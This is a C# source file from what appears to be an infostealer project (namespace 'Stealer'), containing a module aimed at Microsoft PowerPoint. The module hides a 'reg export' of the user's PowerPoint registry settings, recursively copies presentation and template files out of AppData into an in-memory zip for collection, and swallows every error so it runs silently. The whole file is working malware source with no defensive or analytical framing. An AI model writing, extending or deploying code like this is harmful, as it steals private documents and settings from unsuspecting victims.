using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class PowerPoint : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var powerPointApp = new Counter.CounterApplications { Name = "Microsoft PowerPoint" };
                
                CollectPowerPointRegistry(zip, powerPointApp);
                CollectPowerPointFiles(zip, powerPointApp);
                
                if (powerPointApp.Files.Count > 0)
                {
                    counter.Applications.Add(powerPointApp);
                }
            }
            catch { }
        }

        private void CollectPowerPointRegistry(InMemoryZip zip, Counter.CounterApplications powerPointApp)
        {
            try
            {
                string regPath = @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\PowerPoint";
                string fileName = "powerpoint_registry.reg";
                
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "reg";
                    process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    process.WaitForExit();

                    if (File.Exists(fileName))
                    {
                        string relativePath = Path.Combine("Microsoft", "PowerPoint", fileName);
                        zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                        powerPointApp.Files.Add(relativePath);
                        File.Delete(fileName);
                    }
                }
            }
            catch { }
        }

        private void CollectPowerPointFiles(InMemoryZip zip, Counter.CounterApplications powerPointApp)
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                string[] powerPointPaths = {
                    Path.Combine(appData, "Microsoft", "Templates"),
                    Path.Combine(appData, "Microsoft", "PowerPoint")
                };

                foreach (string powerPointPath in powerPointPaths)
                {
                    if (Directory.Exists(powerPointPath))
                    {
                        CollectPowerPointFilesFromPath(powerPointPath, zip, powerPointApp);
                    }
                }
            }
            catch { }
        }

        private void CollectPowerPointFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications powerPointApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".pptx" || extension == ".ppt" || extension == ".pptm" || 
                            extension == ".potx" || extension == ".pot" || extension == ".potm" ||
                            extension == ".ppsx" || extension == ".pps" || extension == ".ppsm" ||
                            fileName.Contains("powerpoint") || fileName.Contains("template"))
                        {
                            string relativePath = Path.Combine("Microsoft", "PowerPoint", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            powerPointApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
